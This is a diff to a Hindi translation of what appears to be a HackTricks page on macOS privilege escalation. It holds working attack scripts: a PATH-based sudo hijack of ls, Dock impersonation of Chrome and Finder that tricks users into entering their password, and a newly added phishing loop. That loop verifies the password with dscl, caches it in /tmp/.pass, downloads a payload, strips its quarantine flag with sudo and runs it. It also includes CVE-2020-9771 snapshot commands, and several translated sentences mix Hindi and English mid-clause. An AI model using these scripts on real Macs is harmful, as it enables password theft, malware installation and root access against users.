@@ -4,7 +4,7 @@
 
 ## TCC Privilege Escalation
 
-यदि आप TCC विशेषाधिकार वृद्धि के लिए यहाँ आए हैं तो जाएँ:
+अगर आप यहाँ TCC privilege escalation की तलाश में हैं तो जाएँ:
 
 
 {{#ref}}
@@ -13,20 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-कृपया ध्यान दें कि **विशेषाधिकार वृद्धि के बारे में अधिकांश तरकीबें जो Linux/Unix को प्रभावित करती हैं, वे MacOS मशीनों को भी प्रभावित करेंगी**। इसलिए देखें:
+कृपया ध्यान दें कि **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** मशीनों पर भी असर करेंगे। इसलिए देखें:
 
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
 {{#endref}}
 
-## User Interaction
+## उपयोगकर्ता इंटरैक्शन
 
 ### Sudo Hijacking
 
-आप मूल [Sudo Hijacking तकनीक को Linux Privilege Escalation पोस्ट के अंदर पा सकते हैं](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+आप मूल [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) पा सकते हैं।
 
-हालांकि, macOS **उपयोगकर्ता का** **`PATH`** बनाए रखता है जब वह **`sudo`** निष्पादित करता है। जिसका अर्थ है कि इस हमले को प्राप्त करने का एक और तरीका होगा **अन्य बाइनरीज़ को हाईजैक करना** जिन्हें पीड़ित **sudo चलाते समय** निष्पादित करेगा:
+हालाँकि, macOS **maintains** उपयोगकर्ता का **`PATH`** जब वह **`sudo`** चलाता है। इसका मतलब है कि इस हमले को पूरा करने का एक और तरीका यह होगा कि आप **hijack other binaries** जिन्हें पीड़ित **running sudo:** के दौरान चलाएगा।
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
@@ -41,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-ध्यान दें कि एक उपयोगकर्ता जो टर्मिनल का उपयोग करता है, उसके पास **Homebrew स्थापित** होने की उच्च संभावना है। इसलिए **`/opt/homebrew/bin`** में बाइनरीज़ को हाईजैक करना संभव है।
+ध्यान दें कि टर्मिनल का उपयोग करने वाला उपयोगकर्ता बहुत संभवतः **Homebrew installed** रखता है। इसलिए **`/opt/homebrew/bin`** में बाइनरीज़ को hijack करना संभव है।
 
-### डॉक अनुकरण
+### Dock नक़ल
 
-कुछ **सोशल इंजीनियरिंग** का उपयोग करके आप डॉक के अंदर **उदाहरण के लिए Google Chrome** का **अनुकरण** कर सकते हैं और वास्तव में अपना खुद का स्क्रिप्ट चला सकते हैं:
+Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
-कुछ सुझाव:
+Some suggestions:
 
-- डॉक में जांचें कि क्या वहां एक Chrome है, और इस मामले में उस प्रविष्टि को **हटाएं** और डॉक एरे में **उसी स्थिति** में **नकली** **Chrome प्रविष्टि जोड़ें**।
+- Dock में देखें कि क्या Chrome मौजूद है, और उस स्थिति में उस एंट्री को **हटा दें** और **जोड़ें** **नकली** **Chrome प्रविष्टि को उसी स्थिति में** Dock array में।
 ```bash
 #!/bin/sh
 
@@ -126,11 +126,11 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 कुछ सुझाव:
 
-- आप **Finder को Dock से हटा नहीं सकते**, इसलिए यदि आप इसे Dock में जोड़ने जा रहे हैं, तो आप असली Finder के ठीक बगल में नकली Finder रख सकते हैं। इसके लिए आपको **Dock array के शुरुआत में नकली Finder प्रविष्टि जोड़नी होगी**।
-- एक और विकल्प है कि इसे Dock में न रखें और बस इसे खोलें, "Finder को Finder को नियंत्रित करने के लिए पूछना" इतना अजीब नहीं है।
-- एक और विकल्प **बिना पासवर्ड पूछे root तक पहुंच बढ़ाने** का है, वास्तव में Finder से पासवर्ड मांगना ताकि एक विशेषाधिकार प्राप्त क्रिया करने के लिए:
-- Finder से **`/etc/pam.d`** में एक नया **`sudo`** फ़ाइल कॉपी करने के लिए कहें (पासवर्ड मांगने वाला प्रॉम्प्ट यह संकेत देगा कि "Finder sudo को कॉपी करना चाहता है")
-- Finder से एक नया **Authorization Plugin** कॉपी करने के लिए कहें (आप फ़ाइल का नाम नियंत्रित कर सकते हैं ताकि पासवर्ड मांगने वाला प्रॉम्प्ट यह संकेत दे कि "Finder Finder.bundle को कॉपी करना चाहता है")
+- आप **Finder को Dock से हटा नहीं सकते**, इसलिए अगर आप इसे Dock में जोड़ने जा रहे हैं, तो आप नकली Finder को असली के ठीक बगल में रख सकते हैं। इसके लिए आपको **Dock array की शुरुआत में नकली Finder एंट्री जोड़ने** की आवश्यकता होगी।
+- एक और विकल्प यह है कि इसे Dock में न रखें और बस खोल दें, "Finder asking to control Finder" इतना अजीब नहीं लगेगा।
+- किसी घिनौने बॉक्स के साथ password मांगे बिना **escalate to root without asking** करने का एक और तरीका यह है कि Finder को वाकई किसी privileged action के लिए password माँगने पर मजबूर करें:
+- Finder से अनुरोध करें कि वह **`/etc/pam.d`** में एक नया **`sudo`** फ़ाइल कॉपी करे (password माँगने वाला prompt यह संकेत करेगा कि "Finder wants to copy sudo")
+- Finder से अनुरोध करें कि वह एक नया **Authorization Plugin** कॉपी करे (आप फ़ाइल का नाम नियंत्रित कर सकते हैं ताकि password माँगने वाला prompt यह बताए कि "Finder wants to copy Finder.bundle")
 ```bash
 #!/bin/sh
 
@@ -203,12 +203,33 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-## TCC - रूट विशेषाधिकार वृद्धि
+### Password prompt phishing + sudo reuse
 
-### CVE-2020-9771 - mount_apfs TCC बाईपास और विशेषाधिकार वृद्धि
+Malware अक्सर उपयोगकर्ता इंटरैक्शन का दुरुपयोग कर **sudo-सक्षम पासवर्ड** पकड़ता है और इसे प्रोग्रामेटिक रूप से पुन: उपयोग करता है। एक सामान्य प्रवाह:
 
-**कोई भी उपयोगकर्ता** (यहां तक कि बिना विशेषाधिकार वाले) एक टाइम मशीन स्नैपशॉट बना और माउंट कर सकता है और उस स्नैपशॉट के **सभी फ़ाइलों** तक पहुंच सकता है।\
-आवश्यक **केवल विशेषाधिकार** यह है कि उपयोग किए जाने वाले एप्लिकेशन (जैसे `Terminal`) को **पूर्ण डिस्क एक्सेस** (FDA) एक्सेस (`kTCCServiceSystemPolicyAllfiles`) प्राप्त हो, जिसे एक व्यवस्थापक द्वारा प्रदान किया जाना चाहिए।
+1. लॉग इन उपयोगकर्ता की पहचान करने के लिए `whoami` का उपयोग करें।
+2. **पासवर्ड प्रॉम्प्ट्स को लूप करें** जब तक `dscl . -authonly "$user" "$pw"` सफल न लौटाए।
+3. क्रेडेंशियल को कैश करें (उदा., `/tmp/.pass`) और `sudo -S` (stdin के जरिए पासवर्ड) के साथ प्रिविलेज्ड कार्रवाई चलाएं।
+
+उदाहरण: न्यूनतम चेन:
+```bash
+user=$(whoami)
+while true; do
+read -s -p "Password: " pw; echo
+dscl . -authonly "$user" "$pw" && break
+done
+printf '%s\n' "$pw" > /tmp/.pass
+curl -o /tmp/update https://example.com/update
+printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
+```
+चोरी किया गया पासवर्ड तब पुन: उपयोग किया जा सकता है ताकि **Gatekeeper क्वारैंटाइन को `xattr -c` के साथ साफ़ किया जा सके**, LaunchDaemons या अन्य विशेषाधिकार प्राप्त फ़ाइलों को कॉपी किया जा सके, और अतिरिक्त स्टेज गैर-इंटरैक्टिव रूप से चलाए जा सकें।
+
+## TCC - Root Privilege Escalation
+
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+
+**कोई भी उपयोगकर्ता** (यहाँ तक कि बिना विशेषाधिकार वाले उपयोगकर्ता भी) time machine snapshot बना सकता है और उस snapshot की **सभी फ़ाइलों तक पहुँच** प्राप्त कर सकता है.\
+आवश्यक **केवल विशेषाधिकार** यह है कि उपयोग की जाने वाली एप्लिकेशन (जैसे `Terminal`) के पास **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) होना चाहिए जिसे एक admin द्वारा प्रदान किया जाना आवश्यक है।
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -228,15 +249,19 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-एक अधिक विस्तृत व्याख्या [**मूल रिपोर्ट में पाई जा सकती है**](https://theevilbit.github.io/posts/cve_2020_9771/)**।**
+एक अधिक विस्तृत व्याख्या [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
 ## संवेदनशील जानकारी
 
-यह विशेषाधिकार बढ़ाने के लिए उपयोगी हो सकता है:
+यह escalate privileges करने में उपयोगी हो सकता है:
 
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## संदर्भ
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../../banners/hacktricks-training.md}}
